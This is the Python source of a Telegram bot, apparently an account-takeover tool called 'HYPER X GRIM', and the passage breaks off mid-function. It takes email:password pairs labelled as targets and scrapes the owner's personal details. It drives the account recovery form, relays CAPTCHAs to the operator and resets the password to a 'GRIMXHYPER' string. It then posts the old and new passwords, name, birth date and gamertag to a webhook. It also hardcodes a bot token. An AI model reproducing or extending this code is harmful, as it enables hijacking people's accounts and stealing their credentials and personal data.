"""
HYPER X GRIM — Telegram Bot
Full ACSR automation. Production-hardened rewrite.
"""

from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters,
)
import asyncio
import aiohttp
import json
import os
import re
from datetime import datetime, timedelta
import random
import sys
from io import BytesIO
import threading
import traceback
import time

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR  = os.path.join(BASE_DIR, "data")
os.makedirs(DATA_DIR, exist_ok=True)
sys.path.insert(0, BASE_DIR)

# ── Automation imports ────────────────────────────────────────────────────────
warden_scrape       = None
submit_acsr_form    = None
warden_continue_acsr = None
perform_password_reset = None
download_captcha    = None

try:
    from automation.core          import scrape_account_info    as warden_scrape
    from automation.acsr          import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow     as warden_continue_acsr
    from automation.reset_password import perform_password_reset
    from automation.captcha       import download_captcha
    import tempmail
    print("✅ Automation modules loaded")
except ImportError as e:
    print(f"⚠️  Automation modules missing: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
ADMIN_ID  = 8744777152
BOT_TOKEN = "8563665194:AAFq_IljJtcSaBH72CAIdzY-Pwjbx4JDYWQ"

CONFIG_FILE          = os.path.join(BASE_DIR, "config.json")
AUTHORIZED_USERS_FILE = os.path.join(BASE_DIR, "authorized_users.json")
STATS_FILE           = os.path.join(BASE_DIR, "bot_stats.json")

MAX_CONCURRENT_BROWSERS = 3
CAPTCHA_TIMEOUT_MINUTES = 6
MAX_CAPTCHA_ATTEMPTS    = 3

COLOR_PRIMARY = 0x7B2CBF
COLOR_SUCCESS = 0x10B981
COLOR_ERROR   = 0xEF4444
COLOR_WARNING = 0xF59E0B
COLOR_INFO    = 0x3B82F6

E = {
    "access":        "🔑",
    "prefix":        "⚡",
    "change":        "🔄",
    "one_one":       "1️⃣",
    "2_":            "2️⃣",
    "3_":            "3️⃣",
    "4_":            "4️⃣",
    "thunder_react": "⚡",
    "WARN":          "⚠️",
    "Announcement":  "📢",
    "mail":          "📧",
    "Afree":         "🆓",
    "combo":         "🔗",
    "Folder":        "📁",
    "clock_gif":     "⏰",
    "avatar":        "👤",
    "Tick_green":    "✅",
    "Cross":         "❌",
}

# Global semaphore — limits concurrent browser instances
_browser_semaphore = asyncio.Semaphore(MAX_CONCURRENT_BROWSERS)


# ══════════════════════════════════════════════════════════════════════════════
# DATA MANAGER
# ══════════════════════════════════════════════════════════════════════════════
class BotDataManager:
    def __init__(self):
        self.config = self._load(CONFIG_FILE, {
            "webhook_url": "",
            "bot_enabled": True,
            "max_concurrent_users": MAX_CONCURRENT_BROWSERS,
        })
        self.authorized_users = self._load(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {
                "authorized": True,
                "added_by": "system",
                "added_at": str(datetime.now()),
            }
        })
        self.active_sessions     = {}
        self.otp_data            = {}
        self.processing_sessions = {}
        self.stats = self._load(STATS_FILE, {
            "total_processed": 0,
            "total_success":   0,
            "total_failed":    0,
            "users_served":    {},
        })
        for key in ("total_processed", "total_success", "total_failed"):
            self.stats.setdefault(key, 0)
        self.stats.setdefault("users_served", {})

    def _load(self, path, default):
        if os.path.exists(path):
            try:
                with open(path, "r") as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def _save(self, path, data):
        try:
            with open(path, "w") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"⚠️ Save failed {path}: {e}")

    def save_config(self):          self._save(CONFIG_FILE, self.config)
    def save_authorized_users(self): self._save(AUTHORIZED_USERS_FILE, self.authorized_users)
    def save_stats(self):           self._save(STATS_FILE, self.stats)

    def is_authorized(self, uid):
        return (
            str(uid) in self.authorized_users
            and self.authorized_users[str(uid)].get("authorized", False)
        )

    def authorize_user(self, uid, by):
        self.authorized_users[str(uid)] = {
            "authorized": True,
            "added_by":   str(by),
            "added_at":   str(datetime.now()),
        }
        self.save_authorized_users()

    def revoke_user(self, uid):
        self.authorized_users.pop(str(uid), None)
        self.save_authorized_users()

    def generate_otp(self, uid):
        otp = "".join(str(random.randint(0, 9)) for _ in range(6))
        self.otp_data[uid] = {
            "otp":      otp,
            "expires":  datetime.now() + timedelta(minutes=5),
            "attempts": 0,
        }
        return otp

    def verify_otp(self, uid, code):
        if uid not in self.otp_data:
            return False, "No OTP requested. Use /request_otp first."
        d = self.otp_data[uid]
        if datetime.now() > d["expires"]:
            del self.otp_data[uid]
            return False, "OTP expired. Request a new one."
        if d["attempts"] >= 3:
            del self.otp_data[uid]
            return False, "Maximum attempts exceeded."
        if d["otp"] == code:
            del self.otp_data[uid]
            self.active_sessions[uid] = {"authenticated": True, "auth_time": datetime.now()}
            return True, "Authentication successful!"
        d["attempts"] += 1
        return False, f"Invalid OTP. {3 - d['attempts']} attempt(s) remaining."

    def is_authenticated(self, uid):
        if uid not in self.active_sessions:
            return False
        auth_time = self.active_sessions[uid].get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[uid]
            return False
        return True

    def logout(self, uid):
        self.active_sessions.pop(uid, None)

    def update_stats(self, uid, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        ustr = str(uid)
        self.stats["users_served"].setdefault(ustr, {"processed": 0, "success": 0})
        self.stats["users_served"][ustr]["processed"] += 1
        if success:
            self.stats["users_served"][ustr]["success"] += 1
        self.save_stats()

    def cleanup_session(self, uid):
        """Safe cleanup of a processing session — quits driver, removes captcha file."""
        session = self.processing_sessions.pop(uid, None)
        if not session:
            return
        try:
            session["driver"].quit()
        except Exception:
            pass
        cap_file = session.get("captcha_file", "")
        if cap_file and os.path.exists(cap_file):
            try:
                os.remove(cap_file)
            except Exception:
                pass


dm = BotDataManager()


# ══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def escape_md(text):
    if not text:
        return ""
    text = str(text)
    for ch in ["_", "*", "[", "]", "(", ")", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!"]:
        text = text.replace(ch, f"\\{ch}")
    return text


def fmt_msg(title, body, color=COLOR_INFO, fields=None):
    emoji = {
        COLOR_SUCCESS: "✅",
        COLOR_ERROR:   "❌",
        COLOR_WARNING: "⚠️",
        COLOR_PRIMARY: "🛡️",
        COLOR_INFO:    "ℹ️",
    }.get(color, "ℹ️")
    lines = [f"{emoji} *{escape_md(title)}*", "", body]
    if fields:
        lines.append("")
        for f in fields:
            lines.append(f"*{escape_md(f.get('name', ''))}:* {f.get('value', '')}")
    lines += ["", "`HYPER X GRIM • Telegram`"]
    return "\n".join(lines)


def generate_grim_password():
    suffix = "".join(str(random.randint(0, 9)) for _ in range(6))
    return f"GRIMXHYPER{suffix}"


async def send_to_webhook(result):
    url = dm.config.get("webhook_url", "")
    if not url:
        return
    payload = {
        "embeds": [{
            "title":  "✅ Password Changed Successfully",
            "color":  COLOR_SUCCESS,
            "fields": [
                {"name": "📧 Email",         "value": f"`{result.get('email','N/A')}`",       "inline": False},
                {"name": "🔓 Old Password",  "value": f"`{result.get('old_password','N/A')}`","inline": True},
                {"name": "🔒 New Password",  "value": f"`{result.get('new_password','N/A')}`","inline": True},
                {"name": "👤 Name",          "value": result.get("name", "N/A"),              "inline": True},
                {"name": "🎂 DOB",           "value": result.get("dob",  "N/A"),              "inline": True},
                {"name": "🌍 Region",        "value": result.get("region","N/A"),             "inline": True},
                {"name": "💬 Skype ID",      "value": result.get("skype_id","N/A"),           "inline": True},
                {"name": "📧 Skype Email",   "value": result.get("skype_email","N/A"),        "inline": True},
                {"name": "🎮 Gamertag",      "value": result.get("gamertag","N/A"),           "inline": True},
            ],
            "footer":    {"text": f"User ID: {result.get('user_id','?')}"},
            "timestamp": datetime.now().isoformat(),
        }]
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=payload) as r:
                if r.status == 204:
                    print(f"✅ Webhook delivered for {result.get('email')}")
                else:
                    print(f"⚠️ Webhook HTTP {r.status}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# SESSION TIMEOUT WATCHER
# ══════════════════════════════════════════════════════════════════════════════
async def _session_timeout_watcher(uid, chat_id, context: ContextTypes.DEFAULT_TYPE):
    """Auto-cancel a stale captcha session after CAPTCHA_TIMEOUT_MINUTES."""
    await asyncio.sleep(CAPTCHA_TIMEOUT_MINUTES * 60)
    if uid in dm.processing_sessions:
        print(f"⏰ Session timeout for user {uid} — auto-cancelling")
        dm.cleanup_session(uid)
        dm.update_stats(uid, False)
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=fmt_msg(
                    f"{E['clock_gif']} Session Timed Out",
                    f"{E['WARN']} CAPTCHA not solved within {CAPTCHA_TIMEOUT_MINUTES} minutes\\. Session cancelled\\.\nUse /process to start again\\.",
                    COLOR_WARNING,
                ),
                parse_mode="Markdown",
            )
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
# LIVE CONSOLE (non-blocking queue-based progress updater)
# ══════════════════════════════════════════════════════════════════════════════
def _build_console_text(title, lines, footer_label):
    visible = lines[-18:]
    body = "\n".join(f"`{escape_md(l)}`" for l in visible) if visible else "_Connecting..._"
    return (
        f"📟 *{escape_md(title)}*\n"
        f"┌{'─'*40}┐\n"
        f"{body}\n"
        f"└{'─'*40}┘\n"
        f"`HYPER X GRIM • {escape_md(footer_label)}`"
    )


# ══════════════════════════════════════════════════════════════════════════════
# STEP 1 + 2 + 3  — SCRAPE → ACSR FORM → CAPTCHA
# ══════════════════════════════════════════════════════════════════════════════
async def process_account_full(email, password, uid, chat_id, context, custom_password=None):
    loop = asyncio.get_running_loop()

    # ── Step 1: Scrape ────────────────────────────────────────────────────────
    await context.bot.send_message(
        chat_id=chat_id,
        text=fmt_msg(
            f"{E['one_one']} Step 1/5: Scraping Account Info",
            f"{E['access']} Logging into `{escape_md(email)}` to gather account details\\.\\.\\.",
            COLOR_INFO,
        ),
        parse_mode="Markdown",
    )

    log_lines: list[str] = []
    progress_queue: asyncio.Queue = asyncio.Queue()

    progress_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=_build_console_text(f"{E['one_one']} Step 1/5: Live Login Progress", [], email),
        parse_mode="Markdown",
    )

    def on_progress(msg):
        loop.call_soon_threadsafe(progress_queue.put_nowait, msg)

    async def _live_updater(sentinel=None):
        while True:
            msg = await progress_queue.get()
            if msg is sentinel:
                break
            log_lines.append(str(msg))
            try:
                await progress_msg.edit_text(
                    text=_build_console_text(f"{E['one_one']} Step 1/5: Live Login Progress", log_lines, email),
                    parse_mode="Markdown",
                )
            except Exception:
                pass

    sentinel = object()
    updater_task = asyncio.create_task(_live_updater(sentinel))

    async with _browser_semaphore:
        account_info = await loop.run_in_executor(
            None, lambda: _scrape_with_progress(email, password, on_progress)
        )

    await progress_queue.put(sentinel)
    await updater_task

    try:
        await progress_msg.edit_text(
            text=_build_console_text(f"{E['Tick_green']} Login Complete!", log_lines, email),
            parse_mode="Markdown",
        )
    except Exception:
        pass

    if not account_info or account_info.get("error"):
        err = (account_info or {}).get("error", "Could not login")
        shot = (account_info or {}).get("screenshot", "")
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(
                f"{E['Cross']} Login Failed",
                f"**Error:** {escape_md(err)}\n**Account:** `{escape_md(email)}`",
                COLOR_ERROR,
            ),
            parse_mode="Markdown",
        )
        if shot and os.path.exists(shot):
            try:
                with open(shot, "rb") as ph:
                    await context.bot.send_photo(
                        chat_id=chat_id,
                        photo=ph,
                        caption=f"📸 Failure screenshot\n`{escape_md(email)}`",
                        parse_mode="Markdown",
                    )
            except Exception:
                pass
        dm.update_stats(uid, False)
        return

    print(f"✅ Account info scraped: {email}")

    # ── Step 2: ACSR Form ─────────────────────────────────────────────────────
    await context.bot.send_message(
        chat_id=chat_id,
        text=fmt_msg(
            f"{E['2_']} Step 2/5: Submitting ACSR Form",
            f"✅ Scraped: *{escape_md(account_info.get('name','Unknown'))}*\n\nGenerating temp email and submitting recovery form\\.\\.\\.",
            COLOR_INFO,
        ),
        parse_mode="Markdown",
    )

    async with _browser_semaphore:
        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info
        )

    if not captcha_image or not driver:
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(f"{E['Cross']} ACSR Submission Failed", f"{E['WARN']} Could not submit the recovery form\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        dm.update_stats(uid, False)
        return

    print(f"✅ ACSR form submitted — temp: {temp_email}")

    # ── Step 3: Deliver CAPTCHA ───────────────────────────────────────────────
    cap_filename = os.path.join(DATA_DIR, f"captcha_{uid}_{int(datetime.now().timestamp())}.png")
    captcha_image.seek(0)
    with open(cap_filename, "wb") as f:
        f.write(captcha_image.read())

    dm.processing_sessions[uid] = {
        "driver":           driver,
        "token":            token,
        "temp_email":       temp_email,
        "account_info":     account_info,
        "email":            email,
        "password":         password,
        "custom_password":  custom_password,
        "captcha_file":     cap_filename,
        "captcha_attempts": 0,
        "chat_id":          chat_id,
        "start_time":       datetime.now(),
    }

    # Start timeout watcher
    asyncio.create_task(_session_timeout_watcher(uid, chat_id, context))

    with open(cap_filename, "rb") as ph:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=ph,
            caption=(
                f"{E['3_']} *CAPTCHA Required*\n\n"
                f"{E['WARN']} Solve it and reply with:\n"
                f"`/submit_captcha <text>`\n\n"
                f"{E['clock_gif']} Timeout: {CAPTCHA_TIMEOUT_MINUTES} min \\| Attempts: {MAX_CAPTCHA_ATTEMPTS}"
            ),
            parse_mode="Markdown",
        )
    print(f"⏳ Waiting for CAPTCHA from user {uid}")


def _scrape_with_progress(email, password, on_progress):
    """Run scrape and pipe stdout to the progress callback."""
    import io
    old_stdout = sys.stdout
    buf = io.StringIO()
    sys.stdout = buf
    try:
        result = warden_scrape(email, password)
    finally:
        sys.stdout = old_stdout
    if on_progress:
        for line in buf.getvalue().splitlines():
            line = line.strip()
            if line:
                on_progress(line)
    return result


# ══════════════════════════════════════════════════════════════════════════════
# STEP 4 + 5  — ACSR CONTINUE → RESET PASSWORD
# ══════════════════════════════════════════════════════════════════════════════
async def continue_after_captcha(uid, captcha_text, chat_id, context):
    if uid not in dm.processing_sessions:
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(f"{E['Cross']} No Session", f"{E['WARN']} No active CAPTCHA session found\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return

    session      = dm.processing_sessions[uid]
    driver       = session["driver"]
    token        = session["token"]
    account_info = session["account_info"]
    email        = session["email"]
    password     = session["password"]
    loop         = asyncio.get_running_loop()

    # ── Live progress ─────────────────────────────────────────────────────────
    log_lines: list[str] = []
    q: asyncio.Queue = asyncio.Queue()

    prog_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=_build_console_text(f"{E['4_']} Step 4/5: Live ACSR Progress", [], email),
        parse_mode="Markdown",
    )

    def on_prog(msg):
        loop.call_soon_threadsafe(q.put_nowait, msg)

    sentinel = object()

    async def _updater():
        while True:
            msg = await q.get()
            if msg is sentinel:
                break
            log_lines.append(str(msg))
            try:
                await prog_msg.edit_text(
                    text=_build_console_text(f"{E['4_']} Step 4/5: Live ACSR Progress", log_lines, email),
                    parse_mode="Markdown",
                )
            except Exception:
                pass

    updater = asyncio.create_task(_updater())
    print(f"\n🔐 CAPTCHA submitted: '{captcha_text}'")

    async with _browser_semaphore:
        flow_result = await loop.run_in_executor(
            None,
            lambda: _run_acsr_continue_with_progress(driver, account_info, token, captcha_text, on_prog),
        )

    await q.put(sentinel)
    await updater

    # Mark console as done or failed
    is_done = isinstance(flow_result, dict) and flow_result.get("status") == "success"
    try:
        title = f"{E['Tick_green']} ACSR Complete!" if is_done else f"{E['Cross']} ACSR Done"
        await prog_msg.edit_text(
            text=_build_console_text(title, log_lines, email),
            parse_mode="Markdown",
        )
    except Exception:
        pass

    # ── Handle result ─────────────────────────────────────────────────────────
    if not isinstance(flow_result, dict):
        flow_result = {"status": "error", "message": str(flow_result) if flow_result else "Unknown error"}

    status = flow_result.get("status", "error")

    # CAPTCHA retry
    if status == "CAPTCHA_RETRY_NEEDED":
        session["captcha_attempts"] += 1
        if session["captcha_attempts"] >= MAX_CAPTCHA_ATTEMPTS:
            await context.bot.send_message(
                chat_id=chat_id,
                text=fmt_msg(
                    f"{E['Cross']} Max CAPTCHA Attempts",
                    f"{E['WARN']} Used all {MAX_CAPTCHA_ATTEMPTS} attempts\\. Use /process to start over\\.",
                    COLOR_ERROR,
                ),
                parse_mode="Markdown",
            )
            dm.cleanup_session(uid)
            dm.update_stats(uid, False)
            return

        new_img = flow_result.get("captcha_image")
        if not new_img:
            # Try to get fresh captcha from the still-open driver
            try:
                new_img = await loop.run_in_executor(None, download_captcha, driver)
            except Exception:
                pass

        if new_img:
            new_cap = os.path.join(DATA_DIR, f"captcha_{uid}_{int(datetime.now().timestamp())}.png")
            new_img.seek(0)
            with open(new_cap, "wb") as f:
                f.write(new_img.read())
            old_cap = session.get("captcha_file", "")
            if old_cap and os.path.exists(old_cap):
                try:
                    os.remove(old_cap)
                except Exception:
                    pass
            session["captcha_file"] = new_cap
            remaining = MAX_CAPTCHA_ATTEMPTS - session["captcha_attempts"]
            with open(new_cap, "rb") as ph:
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=ph,
                    caption=(
                        f"{E['Cross']} *Wrong CAPTCHA*\n\n"
                        f"Remaining attempts: *{remaining}*\n"
                        f"Use: `/submit_captcha <text>`"
                    ),
                    parse_mode="Markdown",
                )
        else:
            await context.bot.send_message(
                chat_id=chat_id,
                text=fmt_msg(
                    f"{E['Cross']} CAPTCHA Error",
                    f"{E['WARN']} Could not retrieve a new CAPTCHA\\. Use /cancel and try again\\.",
                    COLOR_ERROR,
                ),
                parse_mode="Markdown",
            )
            dm.cleanup_session(uid)
            dm.update_stats(uid, False)
        return

    # CAPTCHA download failed
    if status == "CAPTCHA_DOWNLOAD_FAILED":
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(f"{E['Cross']} CAPTCHA Error", f"{E['WARN']} Failed to download new CAPTCHA\\. Use /cancel\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        dm.cleanup_session(uid)
        dm.update_stats(uid, False)
        return

    # Generic error
    if status == "error":
        msg = flow_result.get("message", "Unknown ACSR error")
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(
                f"{E['Cross']} ACSR Failed",
                f"{E['WARN']} {escape_md(str(msg))}",
                COLOR_ERROR,
            ),
            parse_mode="Markdown",
        )
        dm.cleanup_session(uid)
        dm.update_stats(uid, False)
        return

    # Success — got reset link
    if status != "success":
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(f"{E['Cross']} ACSR None", f"{E['WARN']} Unexpected status: `{escape_md(status)}`", COLOR_ERROR),
            parse_mode="Markdown",
        )
        dm.cleanup_session(uid)
        dm.update_stats(uid, False)
        return

    reset_link = flow_result.get("reset_link", "")
    if not reset_link or not reset_link.startswith("http"):
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(f"{E['Cross']} No Reset Link", f"{E['WARN']} Reset link not found in inbox\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        dm.cleanup_session(uid)
        dm.update_stats(uid, False)
        return

    print(f"✅ Reset link obtained")

    # ── Step 5: Reset password ────────────────────────────────────────────────
    new_password = session.get("custom_password") or generate_grim_password()
    await context.bot.send_message(
        chat_id=chat_id,
        text=fmt_msg(
            f"{E['4_']} Step 5/5: Resetting Password",
            f"Changing password to `{escape_md(new_password)}`\\.\\.\\.",
            COLOR_INFO,
        ),
        parse_mode="Markdown",
    )

    async with _browser_semaphore:
        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )

    if not actual_password:
        await context.bot.send_message(
            chat_id=chat_id,
            text=fmt_msg(f"{E['Cross']} Password Reset Failed", f"{E['WARN']} Could not change the password\\. Try again\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        dm.cleanup_session(uid)
        dm.update_stats(uid, False)
        return

    result = {
        "email":        email,
        "old_password": password,
        "new_password": actual_password,
        "name":         account_info.get("name"),
        "dob":          account_info.get("dob"),
        "region":       account_info.get("region"),
        "skype_id":     account_info.get("skype_id"),
        "skype_email":  account_info.get("skype_email"),
        "gamertag":     account_info.get("gamertag"),
        "user_id":      uid,
    }
    await send_to_webhook(result)
    dm.update_stats(uid, True)
    dm.cleanup_session(uid)

    await context.bot.send_message(
        chat_id=chat_id,
        text=fmt_msg(
            f"{E['Tick_green']} SUCCESS\\! Password Changed\\!",
            f"**Account:** `{escape_md(email)}`",
            COLOR_SUCCESS,
            [
                {"name": "🔓 Old Password", "value": f"`{escape_md(password)}`"},
                {"name": "🔒 New Password", "value": f"`{escape_md(actual_password)}`"},
                {"name": "👤 Name",         "value": escape_md(str(account_info.get("name","N/A")))},
                {"name": "🌍 Region",       "value": escape_md(str(account_info.get("region","N/A")))},
                {"name": f"{E['Folder']} Webhook", "value": "Sent ✅"},
            ],
        ),
        parse_mode="Markdown",
    )
    print(f"\n{'='*60}\n✅ COMPLETED: {email} → {actual_password}\n{'='*60}\n")


def _run_acsr_continue_with_progress(driver, account_info, token, captcha_text, on_progress):
    import io
    old_stdout = sys.stdout
    buf = io.StringIO()
    sys.stdout = buf
    try:
        result = warden_continue_acsr(driver, account_info, token, captcha_text)
    finally:
        sys.stdout = old_stdout
    if on_progress:
        for line in buf.getvalue().splitlines():
            line = line.strip()
            if line:
                on_progress(line)
    return result


# ══════════════════════════════════════════════════════════════════════════════
# AUTH CHECKS
# ══════════════════════════════════════════════════════════════════════════════
async def _check_auth(update, context):
    if not dm.is_authorized(update.effective_user.id):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=fmt_msg(f"{E['Cross']} Not Authorized", f"{E['WARN']} Contact admin \\(ID: `{ADMIN_ID}`\\)\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return False
    return True


async def _check_login(update, context):
    if not dm.is_authenticated(update.effective_user.id):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=fmt_msg(f"{E['Cross']} Not Logged In", f"{E['WARN']} Use /request\\_otp then /verify\\_otp first\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return False
    return True


# ══════════════════════════════════════════════════════════════════════════════
# COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    name = update.effective_user.first_name or "User"
    is_auth = dm.is_authorized(uid)
    if is_auth:
        text = (
            f"👋 <b>Welcome {name}</b>\n\n"
            f"⚡ <b>HYPER X GRIM</b> is online\n\n"
            f"🔐 <b>Get started:</b>\n"
            f"• /request_otp — Get OTP\n"
            f"• /verify_otp &lt;code&gt; — Login\n"
            f"• /process &lt;email:pass&gt; — Process account\n"
            f"• /help — All commands"
        )
    else:
        text = (
            f"👋 <b>Welcome {name}</b>\n\n"
            f"⚡ <b>HYPER X GRIM Bot</b>\n\n"
            f"❌ <b>Not authorized.</b>\n"
            f"Contact admin for access.\n\n"
            f"🆔 Your ID: <code>{uid}</code>"
        )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_auth(update, context):
        return
    uid = update.effective_user.id
    text = (
        f"⚡ *HYPER X GRIM*\n"
        f"*Full ACSR Automation*\n\n"
        f"🔐 *Authentication*\n"
        f"/request\\_otp \\— Get 6\\-digit OTP via DM\n"
        f"/verify\\_otp \\<code\\> \\— Login\n"
        f"/logout \\— End session\n\n"
        f"🔧 *Processing*\n"
        f"/process \\<email:pass\\> \\[new\\_pass\\] \\— Start\n"
        f"/submit\\_captcha \\<text\\> \\— Solve CAPTCHA\n"
        f"/status \\— Session info\n"
        f"/cancel \\— Cancel process\n"
    )
    if uid == ADMIN_ID:
        text += (
            f"\n🛡️ *Admin*\n"
            f"/admin \\— Control panel\n"
            f"/authorize \\<id\\> \\— Grant access\n"
            f"/revoke \\<id\\> \\— Revoke access\n"
            f"/list\\_users \\— View users\n"
            f"/set\\_webhook \\<url\\> \\— Set webhook\n"
            f"/stats \\— Statistics\n"
        )
    text += (
        f"\n📖 *Quick Start*\n"
        f"1️⃣ /request\\_otp\n"
        f"2️⃣ /verify\\_otp \\<code\\>\n"
        f"3️⃣ /process email:pass NewPass\n"
        f"4️⃣ Bot sends CAPTCHA image\n"
        f"5️⃣ /submit\\_captcha \\<text\\>\n"
        f"6️⃣ ✅ Done\\!"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_auth(update, context):
        return
    uid = update.effective_user.id
    if dm.is_authenticated(uid):
        await update.message.reply_text(
            fmt_msg(f"{E['Tick_green']} Already Logged In", f"{E['access']} You are already authenticated\\.", COLOR_INFO),
            parse_mode="Markdown",
        )
        return
    otp = dm.generate_otp(uid)
    try:
        await context.bot.send_message(
            chat_id=uid,
            text=f"🔑 *Your OTP*\n\nCode: `{otp}`\n\nExpires in *5 minutes*\\.\nUse: /verify\\_otp {otp}",
            parse_mode="Markdown",
        )
        await update.message.reply_text(
            fmt_msg(f"{E['mail']} OTP Sent", f"{E['Tick_green']} Check your DMs\\.", COLOR_SUCCESS),
            parse_mode="Markdown",
        )
    except Exception:
        await update.message.reply_text(
            fmt_msg(f"{E['Cross']} DM Failed", f"{E['WARN']} Start a chat with the bot first\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )


async def cmd_verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_auth(update, context):
        return
    if not context.args:
        await update.message.reply_text(
            fmt_msg(f"{E['Cross']} Missing Code", "Usage: /verify\\_otp \\<code\\>", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return
    code = " ".join(context.args).strip()
    ok, msg = dm.verify_otp(update.effective_user.id, code)
    color = COLOR_SUCCESS if ok else COLOR_ERROR
    title = f"{E['Tick_green']} Login Success" if ok else f"{E['Cross']} Login Failed"
    await update.message.reply_text(
        fmt_msg(title, escape_md(msg) + ("\n\nUse /process to begin\\!" if ok else ""), color),
        parse_mode="Markdown",
    )


async def cmd_logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_login(update, context):
        return
    dm.logout(update.effective_user.id)
    await update.message.reply_text(
        fmt_msg(f"{E['Cross']} Logged Out", "Use /request\\_otp to login again\\.", COLOR_INFO),
        parse_mode="Markdown",
    )


async def cmd_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_login(update, context):
        return
    if not context.args:
        await update.message.reply_text(
            fmt_msg(f"{E['Cross']} Invalid Format", "Usage: /process email:password \\[new\\_pass\\]", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return

    account = context.args[0]
    new_pass = " ".join(context.args[1:]).strip() if len(context.args) > 1 else ""

    if ":" not in account:
        await update.message.reply_text(
            fmt_msg(f"{E['Cross']} Bad Format", f"{E['WARN']} Use: `email:password`", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return

    email, password = account.split(":", 1)
    email    = email.strip()
    password = password.strip()
    uid      = update.effective_user.id

    if uid in dm.processing_sessions:
        await update.message.reply_text(
            fmt_msg(f"{E['WARN']} Session Active", "Finish or /cancel your current process first\\.", COLOR_WARNING),
            parse_mode="Markdown",
        )
        return

    final_pass = new_pass or generate_grim_password()
    await update.message.reply_text(
        fmt_msg(
            "🚀 Starting Process",
            f"Target: `{escape_md(email)}`\n🔒 New password: `{escape_md(final_pass)}`",
            COLOR_INFO,
        ),
        parse_mode="Markdown",
    )
    asyncio.create_task(
        process_account_full(email, password, uid, update.effective_chat.id, context, final_pass)
    )


async def cmd_submit_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_login(update, context):
        return
    if not context.args:
        await update.message.reply_text(
            fmt_msg(f"{E['Cross']} Missing Text", "Usage: /submit\\_captcha \\<text\\>", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return
    uid = update.effective_user.id
    if uid not in dm.processing_sessions:
        await update.message.reply_text(
            fmt_msg(f"{E['WARN']} No CAPTCHA Active", f"{E['Cross']} No active CAPTCHA session\\.", COLOR_WARNING),
            parse_mode="Markdown",
        )
        return
    text = " ".join(context.args).strip()
    asyncio.create_task(continue_after_captcha(uid, text, update.effective_chat.id, context))


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_login(update, context):
        return
    uid = update.effective_user.id
    fields = [{"name": "🔒 Authentication", "value": "✅ Logged In"}]

    if uid in dm.processing_sessions:
        s = dm.processing_sessions[uid]
        start = s.get("start_time")
        if isinstance(start, str):
            start = datetime.fromisoformat(start)
        elapsed = int((datetime.now() - start).total_seconds()) if start else 0
        fields += [
            {"name": "⚙️ Status",          "value": "⏳ Awaiting CAPTCHA"},
            {"name": "⏱️ Elapsed",          "value": f"{elapsed//60}m {elapsed%60}s"},
            {"name": f"{E['mail']} Target", "value": f"`{escape_md(s.get('email','?'))}`"},
            {"name": "🔄 CAPTCHA Attempts", "value": f"{s.get('captcha_attempts',0)}/{MAX_CAPTCHA_ATTEMPTS}"},
            {"name": "📝 Next Step",        "value": "/submit\\_captcha \\<text\\>"},
        ]
        ai = s.get("account_info", {})
        if ai and ai.get("name"):
            fields.append({
                "name": "👤 Account",
                "value": (
                    f"**Name:** {escape_md(ai.get('name',''))}\n"
